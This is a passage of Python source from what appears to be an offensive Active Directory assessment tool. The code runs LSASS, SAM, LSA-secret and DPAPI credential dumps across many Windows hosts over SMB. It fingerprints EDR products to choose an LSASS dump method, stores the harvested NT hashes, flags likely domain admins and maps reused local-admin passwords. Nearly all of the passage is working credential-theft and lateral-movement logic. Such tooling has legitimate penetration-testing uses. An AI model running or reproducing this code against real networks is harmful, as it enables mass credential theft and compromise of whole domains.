                CredentialType.LSA, secret.name, secret.plaintext[:32]
            )

    display.stop_credential_stream()
    display.summary(
        {
            CredentialType.SAM: len(result.sam_hashes),
            CredentialType.LSA: len(result.lsa_secrets),
        },
        total=len(stored),
        host=pdc_hostname or pdc_ip,
        elapsed=0.0,
    )

    from adscan_internal.cli.machine_account_persist import persist_machine_account_credential

    for acct, nt in stored:
        if acct.endswith("$"):
            # Machine account: persist with AES key derivation.
            persist_machine_account_credential(
                shell,
                domain=domain,
                machine_account=acct,
                nt_hash=nt,
                kerberos_password=result.machine_account_kerberos_password,
                dc_hostname=pdc_hostname,
                trusted_manual_validation=True,
                ensure_fresh_kerberos_ticket=False,
                prompt_for_user_privs_after=False,
                credential_origin="backup_operators",
                skip_hash_cracking=True,
                verify_credential=False,
            )
        else:
            shell.add_credential(
                domain,
                acct,
                nt,
                skip_hash_cracking=False,
                prompt_for_user_privs_after=False,
                credential_origin="sam_dump",
            )


def run_secretsdump_registries(
    shell: Any,
    *,
    domain: str,
    sam_path: str | None = None,
    system_path: str | None = None,
) -> None:
    """Reject secretsdump.py registry parsing after native migration."""
    _ = (shell, domain, sam_path, system_path)
    print_error(
        "secretsdump.py registry parsing has been removed. "
        "Use the native registry dump parser instead."
    )


def run_dump_lsass(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str | None = None,  # kept for future extensions
) -> None:
    """Dump LSASS using the native async SMB stack only."""
    if _is_bulk_dump_target(host):
        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
        with _temporary_dump_creds(
            shell,
            domain=domain,
            username=username,
            secret=password,
            islocal=islocal,
        ):
            _native_execute_dump_lsass_bulk(shell, domain=domain, hosts=hosts)
        return

    if not _explicit_native_dump_supported(
        host=host, username=username, secret=password
    ):
        print_warning(
            "Native LSASS dump requires a single host and explicit credentials. "
            "For bulk LSASS dumping use 'All' or a valid targets file."
        )
        return

    marked_host = mark_sensitive(host, "hostname")
    print_info(f"Dumping LSASS from host {marked_host} with native async SMB")
    with _temporary_dump_creds(
        shell,
        domain=domain,
        username=username,
        secret=password,
        islocal=islocal,
    ):
        execute_dump_lsass(shell, "", domain, host)


def _parse_lsass_pypykatz_credentials(output: str) -> list[tuple[str, str]]:
    """Extract username/NTLM pairs from pypykatz minidump output."""
    return [
        (cred.username, cred.nt_hash) for cred in parse_pypykatz_credentials(output)
    ]


def run_dump_lsa(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
    include_machine_accounts: bool = True,
) -> None:
    """Dump LSA secrets over SMB using the native async SMB stack only."""
    if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="LSA"
    ):
        return

    is_multi_host_target = _is_bulk_dump_target(host)
    dump_output = _dump_output_path(
        domains_dir=shell.domains_dir,
        domain=domain,
        dump_kind="lsa",
        requested_host=host,
    )

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if is_multi_host_target else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
        "Output": dump_output,
    }

    print_operation_header("LSA Secrets Dump", details=operation_details, icon="🔓")

    if is_multi_host_target:
        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
        with _temporary_dump_creds(
            shell,
            domain=domain,
            username=username,
            secret=password,
            islocal=islocal,
        ):
            _native_execute_dump_lsa_bulk(
                shell,
                domain=domain,
                hosts=hosts,
                auth_username=username,
                include_machine_accounts=include_machine_accounts,
            )
        return

    if not _explicit_native_dump_supported(
        host=host, username=username, secret=password
    ):
        print_warning(
            "Native LSA dump requires a single host and explicit credentials. "
            "For bulk LSA dumping use 'All' or a valid targets file."
        )
        return

    with _temporary_dump_creds(
        shell,
        domain=domain,
        username=username,
        secret=password,
        islocal=islocal,
    ):
        execute_dump_lsa(
            shell,
            "",
            domain,
            host,
            auth_username=username,
            include_machine_accounts=include_machine_accounts,
        )


def run_dump_sam(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Dump SAM database over SMB using the native async SMB stack only."""
    if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="SAM"
    ):
        return

    is_multi_host_target = _is_bulk_dump_target(host)
    dump_output = _dump_output_path(
        domains_dir=shell.domains_dir,
        domain=domain,
        dump_kind="sam",
        requested_host=host,
    )

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if is_multi_host_target else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
        "Output": dump_output,
    }

    print_operation_header("SAM Database Dump", details=operation_details, icon="💾")

    if is_multi_host_target:
        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
        with _temporary_dump_creds(
            shell,
            domain=domain,
            username=username,
            secret=password,
            islocal=islocal,
        ):
            _native_execute_dump_sam_bulk(
                shell,
                domain=domain,
                hosts=hosts,
                auth_username=username,
            )
        return

    if not _explicit_native_dump_supported(
        host=host, username=username, secret=password
    ):
        print_warning(
            "Native SAM dump requires a single host and explicit credentials. "
            "For bulk SAM dumping use 'All' or a valid targets file."
        )
        return

    with _temporary_dump_creds(
        shell,
        domain=domain,
        username=username,
        secret=password,
        islocal=islocal,
    ):
        execute_dump_sam(shell, "", domain, host, auth_username=username)


def run_dump_sam_winrm(
    shell: Any, *, domain: str, username: str, password: str, host: str
) -> None:
    """WinRM SAM dumping is disabled until a native WinRM backend exists."""
    _ = (shell, domain, username, password, host)
    print_warning(
        "WinRM SAM dumping previously depended on an external command. "
        "It is disabled until the native WinRM dump backend is implemented."
    )


def run_dump_dpapi(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Dump DPAPI material over SMB using the native async SMB stack only."""
    if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="DPAPI"
    ):
        return

    is_multi_host_target = _is_bulk_dump_target(host)
    dump_output = _dump_output_path(
        domains_dir=shell.domains_dir,
        domain=domain,
        dump_kind="dpapi",
        requested_host=host,
    )

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if is_multi_host_target else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
        "Output": dump_output,
    }

    print_operation_header(
        "DPAPI Credentials Dump", details=operation_details, icon="🔐"
    )

    if is_multi_host_target:
        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
        with _temporary_dump_creds(
            shell,
            domain=domain,
            username=username,
            secret=password,
            islocal=islocal,
        ):
            _native_execute_dump_dpapi_bulk(shell, domain=domain, hosts=hosts)
        return

    if not _explicit_native_dump_supported(
        host=host, username=username, secret=password
    ):
        print_warning(
            "Native DPAPI dump requires a single host and explicit credentials. "
            "For bulk DPAPI dumping use 'All' or a valid targets file."
        )
        return

    with _temporary_dump_creds(
        shell,
        domain=domain,
        username=username,
        secret=password,
        islocal=islocal,
    ):
        execute_dump_dpapi(shell, "", domain, host, auth_username=username)


def execute_dump_registries(shell: Any, command: str, domain: str) -> None:
    """Reject external registry dump command execution after native migration."""
    _ = (shell, command, domain)
    print_error(
        "External registry dump execution has been removed. "
        "Use run_dump_registries(), which uses native async RRP."
    )


def _native_workspace_dir(shell: Any, domain: str) -> str:
    """Resolve the SMB workspace directory for native dump downloads."""
    domains_dir = getattr(shell, "domains_dir", None) or ""
    return domain_relpath(domains_dir, domain, "smb")


def _native_host_workspace_dir(shell: Any, domain: str, host: str) -> str:
    """Resolve a per-host workspace directory for concurrent native downloads."""
    token = _dump_target_token(host)
    return os.path.join(_native_workspace_dir(shell, domain), "native_bulk", token)


async def _run_native_dump_batch(
    shell: Any,
    *,
    domain: str,
    hosts: list[str],
    dump_kind: str,
) -> list[tuple[str, Any]]:
    """Run one native dump method concurrently across hosts.

    Includes a pre-flight TCP probe on port 445 to skip offline hosts before
    paying the SMB + dump cost (especially important for LSASS which can spend
    30s+ in remote-registry timeouts on an unreachable target).
    """
    if hosts:
        reach = await filter_reachable_hosts(hosts, port=445)
        print_reachability_summary(reach, service_label="SMB", console=_CONSOLE)
        if not reach.reachable:
            render_no_reachable_panel(
                reach,
                operation_label=f"{dump_kind.upper()} Bulk Dump",
                console=_CONSOLE,
            )
            return []
        hosts = list(reach.reachable)

    concurrency = _native_dump_concurrency(dump_kind)
    semaphore = asyncio.Semaphore(concurrency)

    async def _run_one(host: str) -> tuple[str, Any]:
        async with semaphore:
            svc = NativeDumpService()
            config = _build_smb_config_from_shell(shell, host, domain)
            workspace_dir = _native_host_workspace_dir(shell, domain, host)
            if dump_kind == "sam":
                result = await svc.dump_sam(config, workspace_dir=workspace_dir)
            elif dump_kind == "lsa":
                result = await svc.dump_lsa(config, workspace_dir=workspace_dir)
            elif dump_kind == "dpapi":
                result = await svc.dump_dpapi_backup_keys(config)
            elif dump_kind == "lsass":
                result = await svc.dump_lsass(
                    config,
                    workspace_dir=workspace_dir,
                    prefer_backend="auto",
                )
            else:
                raise ValueError(f"Unsupported native dump kind: {dump_kind}")
            return host, result

    return list(await asyncio.gather(*(_run_one(host) for host in hosts)))


async def _run_native_dump_batch_live(
    shell: Any,
    *,
    domain: str,
    hosts: list[str],
    dump_kind: str,
    on_result: Any,  # Callable[[str, Any], tuple[int, list[str]]]
) -> list[tuple[str, Any]]:
    """Generic live bulk runner using asyncio.as_completed.

    Streams ✓/✗ status lines and credential rows as each host completes
    instead of waiting for the full gather to finish.

    ``on_result(host, result)`` is called for each successful host and must
    return ``(n_findings, display_lines)``. ``n_findings`` is used in the status
    line, display_lines are printed as credential rows below it.

    Includes a pre-flight TCP probe on port 445 to skip offline hosts. Bulk
    dumps are the highest-value pre-flight target: a single LSASS attempt
    against an offline workstation can waste 30s+ in remote-registry timeouts.
    """

    # Pre-flight reachability filter: skip offline hosts before paying the
    # SMB + remote-registry cost. Critical at corporate scale where 30-50% of
    # workstations may be powered off at any moment.
    if hosts:
        reach = await filter_reachable_hosts(hosts, port=445)
        print_reachability_summary(reach, service_label="SMB", console=_CONSOLE)
        if not reach.reachable:
            render_no_reachable_panel(
                reach,
                operation_label=f"{dump_kind.upper()} Bulk Dump",
                console=_CONSOLE,
            )
            return []
        hosts = list(reach.reachable)

    concurrency = _native_dump_concurrency(dump_kind)
    semaphore = asyncio.Semaphore(concurrency)
    all_results: list[tuple[str, Any]] = []

    async def _run_one(host: str) -> tuple[str, Any]:
        async with semaphore:
            svc = NativeDumpService()
            config = _build_smb_config_from_shell(shell, host, domain)
            ws = _native_host_workspace_dir(shell, domain, host)
            if dump_kind == "sam":
                result = await svc.dump_sam(config, workspace_dir=ws)
            elif dump_kind == "lsa":
                result = await svc.dump_lsa(config, workspace_dir=ws)
            elif dump_kind == "dpapi":
                result = await svc.dump_dpapi_backup_keys(config)
            else:
                raise ValueError(
                    f"Unsupported dump kind for live runner: {dump_kind!r}"
                )
            return host, result

    tasks = [asyncio.create_task(_run_one(h)) for h in hosts]

    with Progress(
        SpinnerColumn(style=_ICE),
        BarColumn(bar_width=28, style=_MUTED, complete_style=_ICE),
        MofNCompleteColumn(),
        TextColumn("[{task.percentage:>3.0f}%]", style=_MUTED),
        TimeElapsedColumn(),
        console=_CONSOLE,
        transient=False,
    ) as prog:
        task_id = prog.add_task("", total=len(hosts))
        for coro in asyncio.as_completed(tasks):
            host, result = await coro
            all_results.append((host, result))
            prog.advance(task_id)

            if getattr(result, "success", False):
                n, lines = on_result(host, result)
                label = f"[{_ICE}]{n} finding{'s' if n != 1 else ''}[/{_ICE}]"
                _CONSOLE.print(
                    f"  [{_ACID}]✓[/{_ACID}] [{_MUTED}]{host}[/{_MUTED}]  {label}"
                )
                for line in lines:
                    _CONSOLE.print(line)
            else:
                err = str(getattr(result, "error", "") or "")[:70]
                _CONSOLE.print(
                    f"  [{_LAVA}]✗[/{_LAVA}] [{_MUTED}]{host}[/{_MUTED}]"
                    f"  [{_MUTED}]{err}[/{_MUTED}]"
                )

    return all_results


def _render_bulk_summary(
    dump_kind: str,
    results: list[tuple[str, Any]],
    finding_count: int,
    *,
    domain: str | None = None,
) -> None:
    """Premium Rich Panel summary replacing the old print_info_table approach.

    ``domain`` is threaded to :func:`_render_bulk_next_hint` so the
    follow-up suggestion (e.g. ``attack_paths {domain} owned``) renders
    with the live domain rather than a placeholder. Optional with a
    ``None`` default so legacy call sites keep compiling — but every
    bulk dump entrypoint should pass it.
    """
    total = len(results)
    succeeded = sum(1 for _, r in results if getattr(r, "success", False))
    failed = total - succeeded
    failed_list = [
        (h, str(getattr(r, "error", "") or "")[:80])
        for h, r in results
        if not getattr(r, "success", False)
    ]

    lines = [
        f"[{_MUTED}]  Hosts     [/{_MUTED}] [{_ICE}]{total}[/{_ICE}] targeted"
        f"  [{_ACID}]{succeeded}[/{_ACID}] ok"
        f"  [{_LAVA}]{failed}[/{_LAVA}] failed",
        f"[{_MUTED}]  Findings  [/{_MUTED}] [{_ACID}]{finding_count}[/{_ACID}]",
    ]
    border = _ACID if finding_count > 0 else (_AMBER if succeeded > 0 else _LAVA)
    title_color = _ACID if finding_count > 0 else _AMBER
    verdict_glyph = "✓" if finding_count > 0 else "○"
    verdict_label = "Complete" if finding_count > 0 else "No Findings"
    title = f"[bold {title_color}]{verdict_glyph}  {dump_kind.upper()} {verdict_label}[/bold {title_color}]"
    _CONSOLE.print(
        Panel("\n".join(lines), title=title, border_style=border, padding=(0, 1))
    )

    if failed_list:
        fail_table = Table(
            box=rbox.SIMPLE,
            show_header=True,
            header_style=f"bold {_MUTED}",
            pad_edge=False,
        )
        fail_table.add_column("Host", style=_MUTED)
        fail_table.add_column("Error", style=_LAVA)
        for h, err in failed_list[:20]:
            fail_table.add_row(mark_sensitive(h, "hostname"), err)
        _CONSOLE.print(fail_table)

    _render_bulk_next_hint(
        dump_kind,
        finding_count=finding_count,
        succeeded=succeeded,
        domain=domain,
    )


async def _run_lsass_campaign_async(
    shell: Any,
    hosts: list[str],
    domain: str,
    workspace_dir: str,
    method_name: str,
    intel: "EdrIntelligence",
) -> list[_LsassCampaignResult]:
    """Async LSASS bulk campaign with live progress and per-host credential streaming.

    Uses asyncio.as_completed so results display as hosts finish rather than
    waiting for the slowest host. Credentials are saved to shell in-flight.
    """
    concurrency = _native_dump_concurrency("lsass")
    semaphore = asyncio.Semaphore(concurrency)
    _creds = getattr(shell, "current_creds", None) or {}
    auth_username: str | None = str(_creds.get("username") or "").strip() or None
    campaign_results: list[_LsassCampaignResult] = []

    async def _run_one(host: str) -> _LsassCampaignResult:
        async with semaphore:
            config = _build_smb_config_from_shell(shell, host, domain)
            host_ws = _native_host_workspace_dir(shell, domain, host)
            orch = LsassDumpOrchestrator(
                scratch_dir=host_ws,
                progress_cb=lambda _s, _d: None,
            )
            result = await orch.run(
                config=config,
                workspace_dir=host_ws,
                intel=intel,
                preferred_method=method_name,
            )
            if not result.success or not result.dump_result:
                return _LsassCampaignResult(
                    host=host,
                    success=False,
                    cred_count=0,
                    has_da_hint=False,
                    method_used=method_name,
                    error=(result.error or "failed")[:80],
                )
            creds = result.dump_result.credentials
            return _LsassCampaignResult(
                host=host,
                success=True,
                cred_count=len(creds),
                has_da_hint=any(
                    _lsass_is_da_hint(c.username) for c in creds if c.username
                ),
                method_used=result.method_used,
                error=None,
            ), creds

    # Wrap to carry credentials alongside the result dataclass
    async def _run_one_with_creds(host: str) -> tuple[_LsassCampaignResult, tuple]:
        out = await _run_one(host)
        if isinstance(out, tuple):
            return out
        return out, ()

    tasks = [asyncio.create_task(_run_one_with_creds(h)) for h in hosts]

    with Progress(
        SpinnerColumn(style=_ICE),
        BarColumn(bar_width=28, style=_MUTED, complete_style=_ICE),
        MofNCompleteColumn(),
        TextColumn("[{task.percentage:>3.0f}%]", style=_MUTED),
        TimeElapsedColumn(),
        console=_CONSOLE,
        transient=False,
    ) as prog:
        task_id = prog.add_task("", total=len(hosts))

        for coro in asyncio.as_completed(tasks):
            r, creds = await coro
            campaign_results.append(r)
            prog.advance(task_id)

            if r.success:
                da_marker = f"  [{_AMBER}]⚡ DA[/{_AMBER}]" if r.has_da_hint else ""
                _CONSOLE.print(
                    f"  [{_ACID}]✓[/{_ACID}] [{_MUTED}]{r.host}[/{_MUTED}]"
                    f"  [{_ICE}]{r.cred_count} cred{'s' if r.cred_count != 1 else ''}[/{_ICE}]"
                    f"  [{_MUTED}]{r.method_used}[/{_MUTED}]{da_marker}"
                )
                for cred in creds:
                    secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
                    account = (
                        f"{cred.domain}\\{cred.username}"
                        if cred.domain
                        else cred.username
                    )
                    if account and secret:
                        _CONSOLE.print(
                            f"    [{_MUTED}][LSASS][/{_MUTED}]  "
                            f"[{_ACID}]{account}[/{_ACID}]"
                            f"  [{_MUTED}]→  {secret[:32]}[/{_MUTED}]"
                        )
                        try:
                            shell.add_credential(
                                domain or cred.domain,
                                cred.username,
                                secret,
                                source_steps=_build_dump_source_steps(
                                    domain=domain,
                                    dump_kind="LSASS",
                                    host=r.host,
                                    auth_username=auth_username,
                                    credential_username=cred.username,
                                    secret=secret,
                                    source_protocol="smb",
                                ),
                                skip_hash_cracking=False,
                                verify_credential=False,
                                prompt_for_user_privs_after=False,
                                ensure_fresh_kerberos_ticket=False,
                                ui_silent=True,
                                credential_origin="lsass_dump",
                            )
                        except Exception as exc:
                            telemetry.capture_exception(exc)
            else:
                _CONSOLE.print(
                    f"  [{_LAVA}]✗[/{_LAVA}] [{_MUTED}]{r.host}[/{_MUTED}]"
                    f"  [{_MUTED}]{r.error or ''}[/{_MUTED}]"
                )

    return campaign_results


def _print_native_bulk_result_summary(
    *,
    dump_kind: str,
    total_hosts: int,
    successful_hosts: int,
    finding_count: int,
    failed_hosts: list[tuple[str, str]],
) -> None:
    """Render a compact native bulk dump summary."""
    rows = [
        {
            "Dump": dump_kind.upper(),
            "Hosts": total_hosts,
            "Succeeded": successful_hosts,
            "Failed": len(failed_hosts),
            "Findings": finding_count,
        }
    ]
    print_info_table(
        rows,
        ["Dump", "Hosts", "Succeeded", "Failed", "Findings"],
        title="Native Async Dump Summary",
    )
    if failed_hosts:
        failure_rows = [
            {"Host": mark_sensitive(host, "hostname"), "Error": error}
            for host, error in failed_hosts[:15]
        ]
        print_info_table(failure_rows, ["Host", "Error"], title="Native Dump Failures")


def _native_execute_dump_sam_bulk(
    shell: Any,
    *,
    domain: str,
    hosts: list[str],
    auth_username: str | None,
) -> None:
    """Live SAM bulk campaign with inline admin badges and post-dump reuse matrix.

    Each credential is tagged with ``[ADM]`` (local admin) or ``[usr]`` based on
    SAMR BUILTIN\\Administrators membership enumerated during the dump itself.
    Cross-host reuse is computed by pure data matching at the end (no extra
    network round-trips, since the admin flag was set during extraction.
    """
    if not hosts:
        print_warning("No targets for SAM campaign.")
        return

    _ = auth_username  # legacy parameter kept for compatibility
    bulk_summary: dict[str, dict[str, Any]] = {}
    bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
    finding_count = 0
    admin_finding_count = 0

    def _on_result(host: str, result: Any) -> tuple[int, list[str]]:
        nonlocal finding_count, admin_finding_count
        lines: list[str] = []
        n = 0
        for cred in getattr(result, "credentials", ()):
            ok, _ = _should_include_for_reuse_validation(
                username=cred.username, rid=str(cred.rid), nt_hash=cred.nt_hash
            )
            if not ok:
                continue
            n += 1
            finding_count += 1
            is_admin = bool(getattr(cred, "is_local_admin", False))
            if is_admin:
                admin_finding_count += 1
            _record_bulk_finding(
                bulk_summary, host=host, username=cred.username, is_hash=True
            )
            _record_bulk_credential(
                bulk_credentials,
                username=cred.username,
                credential=cred.nt_hash,
                is_hash=True,
                host=host,
            )
            badge = _SAM_ADM_BADGE if is_admin else _SAM_USR_BADGE
            user_color = _LAVA if is_admin else _ACID
            lines.append(
                f"    [{_MUTED}][SAM][/{_MUTED}]  {badge}"
                f"  [bold {user_color}]{cred.username}[/bold {user_color}]"
                f"  [{_MUTED}]→  {cred.nt_hash[:32]}[/{_MUTED}]"
            )
        return n, lines

    _CONSOLE.print(
        f"\n[bold {_ICE}]◉  SAM Campaign[/bold {_ICE}]"
        f"  [{_MUTED}]{len(hosts)} hosts[/{_MUTED}]\n"
    )
    results = _run_native_async(
        _run_native_dump_batch_live(
            shell, domain=domain, hosts=hosts, dump_kind="sam", on_result=_on_result
        )
    )
    _CONSOLE.print()
    _persist_bulk_sam_local_credentials(
        shell, domain=domain, credentials=bulk_credentials
    )
    _print_bulk_summary(dump_kind="SAM", summary=bulk_summary)
    _render_bulk_summary("SAM", results, finding_count, domain=domain)

    # Post-dump reuse matrix: pure data match, no network. Highlights
    # credentials that grant local admin on multiple hosts.
    matrix = _build_local_admin_reuse_matrix(results)
    if matrix:
        attack_steps = sum(len(hosts_list) for hosts_list in matrix.values())
        _CONSOLE.print()
        _render_sam_reuse_matrix(matrix, attack_steps_generated=attack_steps)


def _native_execute_dump_lsa_bulk(
    shell: Any,
    *,
    domain: str,
    hosts: list[str],
    auth_username: str | None,
    include_machine_accounts: bool,
) -> None:
    """Live LSA bulk campaign: streams machine-account hashes as each host completes."""
    if not hosts:
        print_warning("No targets for LSA campaign.")
        return

    bulk_summary: dict[str, dict[str, Any]] = {}
    bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
    finding_count = 0

    def _on_result(host: str, result: Any) -> tuple[int, list[str]]:
        nonlocal finding_count
        machine_hash = getattr(result, "machine_account_nt_hash", None)
        if not machine_hash:
            return 0, []
        machine_user = f"{host.split('.')[0]}$"
        finding_count += 1
        _record_bulk_finding(
            bulk_summary, host=host, username=machine_user, is_hash=True
        )
        _record_bulk_credential(
            bulk_credentials,
            username=machine_user,
            credential=machine_hash,
            is_hash=True,
            host=host,
        )
        line = (
            f"    [{_MUTED}][LSA][/{_MUTED}]"
            f"  [{_ACID}]{machine_user}[/{_ACID}]"
            f"  [{_MUTED}]→  {machine_hash[:32]}[/{_MUTED}]"
        )
        return 1, [line]

    _CONSOLE.print(
        f"\n[bold {_ICE}]◉  LSA Campaign[/bold {_ICE}]"
        f"  [{_MUTED}]{len(hosts)} hosts[/{_MUTED}]\n"
    )
    results = _run_native_async(
        _run_native_dump_batch_live(
            shell, domain=domain, hosts=hosts, dump_kind="lsa", on_result=_on_result
        )
    )
    _CONSOLE.print()
    _persist_bulk_credentials(
        shell,
        domain=domain,
        dump_kind="LSA",
        auth_username=auth_username,
        credentials=bulk_credentials,
        include_machine_accounts=include_machine_accounts,
    )
    _print_bulk_summary(dump_kind="LSA", summary=bulk_summary)
    _render_bulk_summary("LSA", results, finding_count, domain=domain)


def _native_execute_dump_dpapi_bulk(
    shell: Any,
    *,
    domain: str,
    hosts: list[str],
) -> None:
    """Live DPAPI bulk campaign: streams backup key GUIDs as each host completes."""
    if not hosts:
        print_warning("No targets for DPAPI campaign.")
        return

    finding_count = 0

    def _on_result(host: str, result: Any) -> tuple[int, list[str]]:
        nonlocal finding_count
        keys = getattr(result, "backup_keys", ())
        finding_count += len(keys)
        lines = [
            f"    [{_MUTED}][DPAPI][/{_MUTED}]"
            f"  [{_ICE}]{key.guid}[/{_ICE}]"
            f"  [{_MUTED}]{len(key.key_bytes)} bytes[/{_MUTED}]"
            for key in keys
        ]
        return len(keys), lines

    _CONSOLE.print(
        f"\n[bold {_ICE}]◉  DPAPI Campaign[/bold {_ICE}]"
        f"  [{_MUTED}]{len(hosts)} hosts[/{_MUTED}]\n"
    )
    results = _run_native_async(
        _run_native_dump_batch_live(
            shell, domain=domain, hosts=hosts, dump_kind="dpapi", on_result=_on_result
        )
    )
    _CONSOLE.print()
    _render_bulk_summary("DPAPI", results, finding_count, domain=domain)


def _native_execute_dump_lsass_bulk(
    shell: Any,
    *,
    domain: str,
    hosts: list[str],
) -> None:
    """Intelligent LSASS bulk campaign: smart targeting → sample fingerprint → live sweep."""
    if not hosts:
        print_warning("No targets for LSASS campaign.")
        return

    workspace_dir = _native_workspace_dir(shell, domain)
    intel = EdrIntelligence(workspace_dir)

    # Smart targeting: DCs first, fall back to the full resolved list
    dc_hosts, tier_label = _lsass_smart_targets(shell, domain)
    if not dc_hosts:
        dc_hosts = hosts
        tier_label = f"{len(hosts)} hosts"

    # Sample fingerprint on the first DC to drive method selection
    fp_sample: HostFingerprint | None = None
    try:
        config_sample = _build_smb_config_from_shell(shell, dc_hosts[0], domain)
        with Progress(
            SpinnerColumn(style=_ICE),
            TextColumn(f"[{_MUTED}]Fingerprinting {dc_hosts[0]}...[/{_MUTED}]"),
            transient=True,
            console=_CONSOLE,
        ) as prog:
            prog.add_task("")
            fp_sample = _run_native_async(
                HostFingerprintService().fingerprint(config_sample)
            )
        if fp_sample and fp_sample.detected_products:
            intel.record_host_products(
                config_sample.target_ip,
                [(p.name, p.category) for p in fp_sample.detected_products],
            )
        if fp_sample:
            ranked = LsassMethodSelector.rank(fp_sample, intel)
            _render_fingerprint_panel(fp_sample, ranked)
    except Exception as exc:
        telemetry.capture_exception(exc)
        fp_sample = None

    ranked = LsassMethodSelector.rank(
        fp_sample or HostFingerprint(target_ip="sample"), intel
    )
    best_method = ranked[0]

    # Confirmation panel: offer to expand from DCs to all hosts
    proceed, selected_hosts = _lsass_campaign_confirmation(
        dc_hosts, tier_label, hosts, best_method
    )
    if not proceed:
        return

    _CONSOLE.print(
        f"\n[bold {_ICE}]◉  LSASS Campaign[/bold {_ICE}]"
        f"  [{_MUTED}]{tier_label}  ·  {len(selected_hosts)} hosts  ·  {best_method.name}[/{_MUTED}]\n"
    )

    results = _run_native_async(
        _run_lsass_campaign_async(
            shell, selected_hosts, domain, workspace_dir, best_method.name, intel
        )
    )

    _CONSOLE.print()
    _render_lsass_campaign_summary(results)


# ---------------------------------------------------------------------------
# SAM local-admin detection + reuse helpers
# ---------------------------------------------------------------------------

# Credential row for the stream: extra field signals admin status
_SAM_ADM_BADGE = f"[bold {_LAVA}][ADM][/bold {_LAVA}]"
_SAM_USR_BADGE = f"[{_MUTED}][usr][/{_MUTED}]"


def _sam_admin_extras(cred: Any) -> str:
    """Return the extras string for DumpDisplay.stream_credential."""
    badge = _SAM_ADM_BADGE if getattr(cred, "is_local_admin", False) else _SAM_USR_BADGE
    parts = [f"RID:{cred.rid}", badge]
    is_enabled = getattr(cred, "is_enabled", True)
    nt_hash = str(getattr(cred, "nt_hash", "") or "").lower()
    if not is_enabled:
        parts.append(f"[{_MUTED}]DISABLED[/{_MUTED}]")
    elif nt_hash == _EMPTY_NTLM_HASH:
        parts.append(f"[{_AMBER}]BLANK PWD[/{_AMBER}]")
    return "  ".join(parts)


def _build_local_admin_reuse_matrix(
    results: list[tuple[str, Any]],
) -> dict[tuple[str, str], list[str]]:
    """Pure data: map (username, nt_hash) → [hosts where cred is local admin].

    Only includes credentials where ``is_local_admin=True`` on at least one host.
    The same (username, hash) pair seen on multiple hosts means password reuse.
    """
    matrix: dict[tuple[str, str], list[str]] = {}
    for host, result in results:
        if not getattr(result, "success", False):
            continue
        for cred in getattr(result, "credentials", ()):
            if not getattr(cred, "is_local_admin", False):
                continue
            key = (cred.username, cred.nt_hash)
            matrix.setdefault(key, []).append(host)
    return matrix


def _render_sam_reuse_matrix(
    matrix: dict[tuple[str, str], list[str]],
    attack_steps_generated: int = 0,
) -> None:
    """Premium Rich panel: local admin reuse matrix sorted by impact.

    High-reuse credentials (≥3 hosts) get a lava highlight.
    Single-host admin creds get a quieter acid color.
    """
    if not matrix:
        _CONSOLE.print(
            Panel(
                f"[{_MUTED}]No local admin credentials found for reuse analysis.[/{_MUTED}]",
                title=f"[{_MUTED}]Local Admin Reuse[/{_MUTED}]",
                border_style=_MUTED,
                padding=(0, 1),
            )
        )
        return

    table = Table(
        box=rbox.SIMPLE,
        show_header=True,
        header_style=f"bold {_ICE}",
        pad_edge=False,
        show_edge=False,
    )
    table.add_column("", width=3, no_wrap=True)
    table.add_column("User", style=f"bold {_ACID}", min_width=18, no_wrap=True)
    table.add_column("Hash", style=_MUTED, width=10, no_wrap=True)
    table.add_column("Admin on", justify="right", width=8)
    table.add_column("Status", no_wrap=True)

    sorted_creds = sorted(matrix.items(), key=lambda x: len(x[1]), reverse=True)
    for (username, nt_hash), admin_hosts in sorted_creds:
        n = len(admin_hosts)
        if n >= 3:
            icon = f"[bold {_LAVA}]⚡[/bold {_LAVA}]"
            count_cell = f"[bold {_LAVA}]{n}[/bold {_LAVA}]"
            status_cell = f"[bold {_LAVA}]Pwn3d × {n}[/bold {_LAVA}]"
        elif n >= 2:
            icon = f"[{_AMBER}]⚡[/{_AMBER}]"
            count_cell = f"[{_AMBER}]{n}[/{_AMBER}]"
            status_cell = f"[{_AMBER}]Pwn3d × {n}[/{_AMBER}]"
        else:
            icon = f"[{_ACID}]·[/{_ACID}]"
            count_cell = f"[{_ACID}]{n}[/{_ACID}]"
            status_cell = f"[{_ACID}]admin (1 host)[/{_ACID}]"
        table.add_row(icon, username, nt_hash[:8] + "…", count_cell, status_cell)

    total_pwned = sum(len(h) for h in matrix.values())
    high_reuse = sum(1 for h in matrix.values() if len(h) >= 3)

    lines: list[str] = []
    if high_reuse:
        lines.append(
            f"[bold {_LAVA}]  ⚡  {high_reuse} credential{'s' if high_reuse != 1 else ''}"
            f" reused across 3+ hosts[/bold {_LAVA}]"
        )
    if attack_steps_generated:
        lines.append(
            f"[{_MUTED}]  →  {attack_steps_generated} localadminpassreuse"
            f" attack step{'s' if attack_steps_generated != 1 else ''} generated[/{_MUTED}]"
        )

    title_color = _LAVA if high_reuse else (_AMBER if total_pwned > 1 else _ACID)
    _CONSOLE.print(
        Panel(
            "\n".join(lines) if lines else "",
            title=f"[bold {title_color}]⚡  Local Admin Reuse Matrix[/bold {title_color}]",
